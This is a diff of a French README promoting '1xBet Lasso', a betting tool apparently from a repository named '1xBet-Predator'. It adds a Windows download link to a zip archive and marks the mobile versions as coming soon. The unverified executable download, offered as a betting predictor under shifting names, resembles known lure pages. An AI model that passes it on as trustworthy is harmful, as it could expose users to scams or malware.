@@ -26,10 +26,15 @@ ________________________________________________________________________________
 ****xBet Lasso**** est actuellement en cours de développement, mais il est ouvert à tous pour le tester. Cela permet à la communauté des parieurs de fournir des retours et des suggestions pour améliorer encore plus l'outil. En offrant un accès à cette phase de test, l'équipe derrière 1xBet Predator cherche à impliquer les utilisateurs dans le processus de développement et à s'assurer que l'outil répond aux besoins et aux attentes de la communauté des parieurs sportifs.
 ![Capture d'écran 2024-03-02 142311](https://github.com/boris-Olinga/1xBet-Predator/assets/109936676/9ed07c46-5adb-4241-824a-8682be8966b9)
 
-**Téléchargez 1xBet Lasso Windows en suivant le lien ci-dessous :** [lien de téléchargement].
-**Téléchargez 1xBet Lasso Android  en suivant le lien ci-dessous :** [lien de téléchargement].
-**Téléchargez 1xBet Lasso Iphone  en suivant le lien ci-dessous :** [lien de téléchargement].
+**Téléchargez 1xBet Lasso Windows en suivant le lien ci-dessous :** [1xBet Lasso 1.0.zip](https://github.com/boris-Olinga/1xBet-Predator/files/14473165/1xBet.Lasso.1.0.zip)
+ .
 
+
+_______________________________________________________________________________________________________________
+**Téléchargez 1xBet Lasso Android  en suivant le lien ci-dessous :** Bientôt disponible.
+_______________________________________________________________________________________________________________
+**Téléchargez 1xBet Lasso Iphone  en suivant le lien ci-dessous :**  Bientôt disponible.
+===============================================================================================================
 
 
 
